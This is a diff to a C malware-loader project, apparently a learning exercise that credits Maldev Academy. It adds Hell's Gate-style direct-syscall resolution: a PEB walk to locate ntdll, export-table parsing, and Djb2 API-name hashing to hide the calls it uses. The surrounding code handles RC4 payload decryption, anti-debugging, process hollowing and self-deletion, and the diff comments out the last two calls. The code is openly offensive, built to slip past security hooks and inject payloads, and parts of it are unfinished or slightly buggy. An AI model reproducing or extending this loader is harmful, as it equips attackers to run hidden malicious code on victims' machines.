@@ -4,6 +4,21 @@
 #include <stdio.h>
 
 
+//Hells Gate Additions
+typedef struct _VX_TABLE_ENTRY {
+    PVOID   pAddress;
+    DWORD64 dwHash;
+    WORD    wSystemCall;
+} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
+
+typedef struct _VX_TABLE {
+    VX_TABLE_ENTRY NtAllocateVirtualMemory;
+    VX_TABLE_ENTRY NtProtectVirtualMemory;
+    VX_TABLE_ENTRY NtCreateThreadEx;
+    VX_TABLE_ENTRY NtWaitForSingleObject;
+} VX_TABLE, * PVX_TABLE;
+
+
 // this is what SystemFunction032 function take as a parameter
 typedef struct
 {
@@ -18,7 +33,7 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032)(
     struct USTRING* Img,
     struct USTRING* Key
     );
-
+//Maldev Academy
 BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
 
     // the return of SystemFunction032
@@ -349,24 +364,96 @@ BOOL DeleteSelf() {
     return TRUE;
 }
 
-void GetBase(IN PPEB pPEB, OUT PVOID *pBaseAddr) {
 
+
+
+
+
+//Also not that this is essentially a custom GetModuleHandle??? 
+void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr) {
     PPEB_LDR_DATA ldr = pPEB->Ldr;
-
     PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
-
     PLIST_ENTRY entry = listEntry->Flink;
 
+    printf("Entry found:\n");
     while (entry != listEntry) {
+        PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
 
-        PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (tableEntry->BaseDllName.Buffer) {
+            // Print the module name (wide character string)
+            wprintf(L"%ls\n", tableEntry->BaseDllName.Buffer);
+        }
 
         if (tableEntry->BaseDllName.Buffer && wcscmp(tableEntry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
             *pBaseAddr = tableEntry->DllBase;
-            break;
+            return; // Successfully found and assigned the base address
         }
+
+        entry = entry->Flink; // Move to the next entry
     }
-    return (PVOID)NULL;
+    *pBaseAddr = NULL; // No match found, set base address to NULL
+}
+
+
+void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
+
+    PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
+                                                                        //so we get access to NT headers
+
+
+    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew); 
+
+
+    //Now from the NT header we can extract the export address table for all fucntions within the dll
+
+    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+
+}
+
+// generate Djb2 hashes from wide-character input string
+
+#define INITIAL_HASH	3731		// added to randomize 
+#define INITIAL_SEED	7			// recommended to be 0 < INITIAL_SEED < 10
+
+DWORD HashStringDjb2A(_In_ PCHAR String)
+{
+    ULONG Hash = INITIAL_HASH;
+    INT c;
+
+    while (c = *String++)
+        Hash = ((Hash << INITIAL_SEED) + Hash) + c;
+
+    return Hash;
+}
+
+//Now this to me feels like a custom GetProcAddress essentially lol
+void GetVXTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY syscallTableEntry) {
+
+    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
+    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
+    PDWORD pdwAddressOfOrdinals = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
+
+    //Now we need to begin looping through all functions for matches.
+
+    for (WORD i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {
+
+        PCHAR pcxzFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
+        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pdwAddressOfOrdinals[i]]; //we have to use the ordinals array to get the actual index within names array.
+
+
+        if(HashStringDjb2A(pcxzFunctionName) == syscallTableEntry->dwHash){
+            syscallTableEntry->pAddress = pFunctionAddress;
+            //hells gate on github will perform a test to see if the fucntion has been hooked
+            //add that to the to do list :eyes: 0.0
+        }
+
+        //Now since we don't want to pass strings of APIs we will hash and compare hashes to pre-hashed list.
+        //See the API_Hashing module example!
+        
+
+    }
+
 }
 
 int main() {
@@ -394,8 +481,8 @@ int main() {
     //    truePayload[i] = (BYTE)(((DWORD)buf[i] ^ 0xAA) & 0xFF);
     //}
     detectDebug();
-    hollowProcess(Pi, sizeof(Rc4CipherText));
-    DeleteSelf();
+    //hollowProcess(Pi, sizeof(Rc4CipherText));
+    //DeleteSelf();
 
 
 
@@ -405,9 +492,24 @@ int main() {
 
     
     PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
+    PVOID pNtdllBase = NULL;
+    printf("Getting base...\n");
+
 
     //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
     //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.
+
+    GetBase(pCurrentPEB, &pNtdllBase);
+    printf("NTDLL Base: 0x%p\n", pNtdllBase);
+    getchar();
+
+    //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
+    PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
+    GetImageExportDir(pNtdllBase,&ppImageExportDirectory);
+
+    //Now with the image export directory we can loop through function names and find the desired functions for syscalls!
+    //GetVxTableEntry();
+    
 
 
     return 0;
